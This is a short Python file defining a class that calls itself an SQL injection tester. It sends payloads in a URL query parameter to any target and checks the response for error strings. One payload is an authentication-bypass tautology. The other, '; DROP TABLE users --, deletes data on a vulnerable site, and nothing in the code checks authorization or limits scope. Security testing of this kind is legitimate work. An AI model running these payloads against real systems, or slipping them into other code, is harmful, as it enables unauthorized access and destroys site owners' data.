import requests


class SQLInjectionTester:
    """
    A class for testing SQL injection vulnerabilities in a web application.
    Args:
        target_url (str): The URL of the target web application.
        param (str): The parameter to be tested for SQL injection.
    Attributes:
        target_url (str): The URL of the target web application.
        param (str): The parameter to be tested for SQL injection.
        payloads (list): A list of SQL injection payloads.
    Methods:
        run_test(): Runs the SQL injection test and returns the results.
    """
    """
    Runs the SQL injection test and returns the results.
    Returns:
        list: A list of tuples containing the payload and a boolean indicating if the test was successful.
    """

    def __init__(self, target_url, param):
        self.target_url = target_url
        self.param = param
        self.payloads = ["' OR '1'='1", "'; DROP TABLE users --"]

    def run_test(self):
        results = []
        for payload in self.payloads:
            test_url = f"{self.target_url}?{self.param}={payload}"
            response = requests.get(test_url)
            if "SQL" in response.text or "syntax" in response.text:
                results.append((payload, True))
            else:
                results.append((payload, False))
        return results
